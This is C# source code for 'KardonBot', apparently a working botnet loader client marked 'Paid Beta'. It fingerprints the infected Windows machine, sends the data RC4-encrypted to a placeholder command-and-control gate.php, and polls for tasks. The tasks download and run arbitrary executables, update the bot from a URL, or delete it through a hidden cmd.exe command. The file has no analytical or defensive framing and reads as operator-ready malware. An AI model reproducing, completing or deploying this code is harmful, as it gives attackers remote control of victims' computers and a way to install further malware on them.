using System;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Security.Cryptography;
using System.Diagnostics;
using System.IO;
using System.Threading.Tasks;
using System.Security.Principal; // Required for IsAdmin()

namespace KardonBot
{
    class Program
    {
        private static string C2_URL = "___C2_URL___"; // Placeholder for C2 URL, should point to gate.php
        private static string MUTEX = "___MUTEX___"; // Placeholder for mutex
        private static Random rand = new Random();
        private static string logPath = Path.Combine(Path.GetTempPath(), "kardon_log.txt"); // Log to temp directory
        private static HttpClient httpClient = new HttpClient();

        // IMPORTANT: Replace "YOUR_SUPER_SECRET_RC4_KEY_HERE" with the EXACT SAME KEY you put in config.php!
        private static readonly byte[] RC4_KEY = Encoding.UTF8.GetBytes("YOUR_SUPER_SECRET_RC4_KEY_HERE");

        static async Task Main(string[] args)
        {
            Directory.CreateDirectory(Path.GetDirectoryName(logPath));
            Log("Bot started on .NET 8.0");

            try
            {
                using (Mutex mutex = new Mutex(true, MUTEX, out bool createdNew))
                {
                    if (!createdNew) { Log("Mutex already exists, exiting"); Environment.Exit(0); }
                }
            }
            catch (Exception ex) { Log($"Mutex error: {ex.Message}"); }

            int delay = rand.Next(2000, 5000);
            Log($"Delaying for {delay}ms");
            Thread.Sleep(delay);

            string hwid = GetHWID();
            string username = Environment.UserName;
            string computername = Environment.MachineName;
            string os = Environment.OSVersion.VersionString;
            string cpuarchitect = Environment.Is64BitOperatingSystem ? "x64" : "x86";
            string priv = IsAdmin() ? "Admin" : "User";
            string botversion = "Paid Beta";
            string installpath = Process.GetCurrentProcess().MainModule.FileName;
            string mark = "1"; // Default mark as "Clean" on first contact.

            Log($"HWID: {hwid}, Username: {username}, ComputerName: {computername}, OS: {os}, Arch: {cpuarchitect}, Priv: {priv}, InstallPath: {installpath}");

            // Set HttpClient BaseAddress once to the gate.php URL
            if (!string.IsNullOrEmpty(C2_URL) && Uri.IsWellFormedUriString(C2_URL, UriKind.Absolute))
            {
                httpClient.BaseAddress = new Uri(C2_URL);
            }
            else
            {
                Log("Invalid C2_URL configured. Exiting.");
                Environment.Exit(1);
            }

            while (true)
            {
                try
                {
                    Log($"Sending POST to {C2_URL}");

                    // RC4 encrypt and Base64 encode parameters before sending
                    // TEMPORARY BYPASS FOR HWID: Only Base64 encode HWID for debugging gate.php
                    string postData =
                                      $"id={Uri.EscapeDataString(Convert.ToBase64String(Encoding.UTF8.GetBytes(hwid)))}" + // <--- TEMPORARY: NO RC4 ENCRYPTION FOR HWID HERE
                                      $"&os={Uri.EscapeDataString(Convert.ToBase64String(RC4Encrypt(os)))}" +
                                      $"&pv={Uri.EscapeDataString(Convert.ToBase64String(RC4Encrypt(priv)))}" +
                                      $"&ip={Uri.EscapeDataString(Convert.ToBase64String(RC4Encrypt(installpath)))}" +
                                      $"&cn={Uri.EscapeDataString(Convert.ToBase64String(RC4Encrypt(computername)))}" +
                                      $"&un={Uri.EscapeDataString(Convert.ToBase64String(RC4Encrypt(username)))}" +
                                      $"&ca={Uri.EscapeDataString(Convert.ToBase64String(RC4Encrypt(cpuarchitect)))}" +
                                      $"&bv={Uri.EscapeDataString(Convert.ToBase64String(RC4Encrypt(botversion)))}";


                    var content = new StringContent(postData, Encoding.UTF8, "application/x-www-form-urlencoded");
                    HttpResponseMessage response = await httpClient.PostAsync("", content); // Send to base address (C2_URL)
                    string responseBody = await response.Content.ReadAsStringAsync();
                    Log($"Response: {responseBody}, Status: {response.StatusCode}");

                    if (!string.IsNullOrEmpty(responseBody))
                    {
                        if (responseBody == "notask")
                        {
                            Log("No tasks available");
                        }
                        else
                        {
                            // Task response format: "newtask`taskId`taskType`param"
                            string[] parts = responseBody.Split('`');
                            if (parts.Length >= 4 && parts[0] == "newtask")
                            {
                                string taskId = parts[1];
                                string taskType = parts[2];
                                string param = parts[3];
                                Log($"Task ID: {taskId}, Type: {taskType}, Param: {param}");

                                switch (taskType)
                                {
                                    case "1": // Download & Execute
                                        await DownloadAndExecute(param, taskId, hwid);
                                        break;
                                    case "2": // Update
                                        await UpdateBot(param, taskId, hwid);
                                        break;
                                    case "3": // Uninstall
                                        await UninstallBot(taskId, hwid);
                                        break;
                                    default:
                                        Log($"Unknown task: {taskType}");
                                        break;
                                }
                            }
                            else
                            {
                                Log("Invalid response format or unknown task prefix.");
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    Log($"Error in main loop: {ex.Message}");
                }
                int pollDelay = rand.Next(30000, 60000); // Poll every 30-60 seconds
                Log($"Sleeping for {pollDelay}ms");
                await Task.Delay(pollDelay);
            }
        }

        private static void Log(string message)
        {
            string logEntry = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {message}\n";
            try
            {
                File.AppendAllText(logPath, logEntry);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error writing to log file: {ex.Message}");
            }
            Console.WriteLine(logEntry);
        }

        private static string GetHWID()
        {
            using (MD5 md5 = MD5.Create())
            {
                byte[] input = Encoding.UTF8.GetBytes(Environment.MachineName + Environment.UserName);
                byte[] hash = md5.ComputeHash(input);
                return BitConverter.ToString(hash).Replace("-", "").ToLower();
            }
        }

        private static bool IsAdmin()
        {
            try
            {
                WindowsIdentity identity = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch { return false; }
        }

        // RC4 Encryption function matching the PHP implementation logic in rc4.php
        private static byte[] RC4Encrypt(string data)
        {
            byte[] dataBytes = Encoding.UTF8.GetBytes(data);
            byte[] state = new byte[256];
            byte[] key = RC4_KEY;

            for (int i = 0; i < 256; i++)
            {
                state[i] = (byte)i;
            }

            int j = 0;
            for (int i = 0; i < 256; i++)
            {
                j = (j + state[i] + key[i % key.Length]) % 256;
                byte temp = state[i];
                state[i] = state[j];
                state[j] = temp;
            }

            int x = 0;
            int y = 0;
            byte[] cipher = new byte[dataBytes.Length];
            for (int i = 0; i < dataBytes.Length; i++)
            {
                x = (x + 1) % 256;
                y = (state[x] + y) % 256;
                byte temp = state[x];
                state[x] = state[y];
                state[y] = temp;
                cipher[i] = (byte)(dataBytes[i] ^ state[(state[x] + state[y]) % 256]);
            }
            return cipher;
        }

        // Helper to send task status to gate.php
        private static async Task SendTaskStatus(string taskId, string hwid, string status)
        {
            string opValue = (status == "completed") ? "1" : "2"; // 1 for completed, 2 for failed

            // Parameters for gate.php: id (hwid), op (operation status), td (task ID)
            // Note: HWID here is sent encrypted, unlike the initial check-in for debugging
            string reportPostData = $"id={Uri.EscapeDataString(Convert.ToBase64String(RC4Encrypt(hwid)))}" +
                                    $"&op={Uri.EscapeDataString(Convert.ToBase64String(RC4Encrypt(opValue)))}" + // RC4 encrypt the op value
                                    $"&td={Uri.EscapeDataString(Convert.ToBase64String(RC4Encrypt(taskId)))}";

            var content = new StringContent(reportPostData, Encoding.UTF8, "application/x-www-form-urlencoded");
            await httpClient.PostAsync("", content); // Send to base address (C2_URL)
            Log($"Task {taskId} status sent: {status}");
        }

        private static async Task DownloadAndExecute(string url, string taskId, string hwid)
        {
            try
            {
                string tempPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".exe");
                Log($"Downloading from {url} to {tempPath}");
                byte[] fileBytes = await httpClient.GetByteArrayAsync(url);
                await File.WriteAllBytesAsync(tempPath, fileBytes);
                Process.Start(new ProcessStartInfo(tempPath) { UseShellExecute = true });
                await SendTaskStatus(taskId, hwid, "completed"); // Report completion
                Log("Task 1 executed");
            }
            catch (Exception ex)
            {
                await SendTaskStatus(taskId, hwid, "failed"); // Report failure
                Log($"Task 1 failed: {ex.Message}");
            }
        }

        private static async Task UpdateBot(string url, string taskId, string hwid)
        {
            try
            {
                string tempPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".exe");
                Log($"Updating from {url} to {tempPath}");
                byte[] fileBytes = await httpClient.GetByteArrayAsync(url);
                await File.WriteAllBytesAsync(tempPath, fileBytes);
                // Execute the update. Consider logic for self-replacement if needed for persistence.
                Process.Start(new ProcessStartInfo(tempPath) { UseShellExecute = true });
                await SendTaskStatus(taskId, hwid, "completed"); // Report completion
                Log("Task 2 executed");
                Environment.Exit(0); // Exit the current bot process after launching the update
            }
            catch (Exception ex)
            {
                await SendTaskStatus(taskId, hwid, "failed"); // Report failure
                Log($"Task 2 failed: {ex.Message}");
            }
        }

        private static async Task UninstallBot(string taskId, string hwid)
        {
            try
            {
                await SendTaskStatus(taskId, hwid, "completed"); // Report completion
                string exePath = Process.GetCurrentProcess().MainModule.FileName;
                Log($"Uninstalling: {exePath}");
                // Use 'cmd.exe /C' for a fire-and-forget deletion, running hidden.
                Process.Start(new ProcessStartInfo("cmd.exe", $"/C timeout 2 & del \"{exePath}\"")
                {
                    UseShellExecute = false,
                    CreateNoWindow = true
                });
                Log("Task 3 executed");
                Environment.Exit(0); // Exit the bot process
            }
            catch (Exception ex)
            {
                await SendTaskStatus(taskId, hwid, "failed"); // Report failure
                Log($"Task 3 failed: {ex.Message}");
            }
        }
    }
}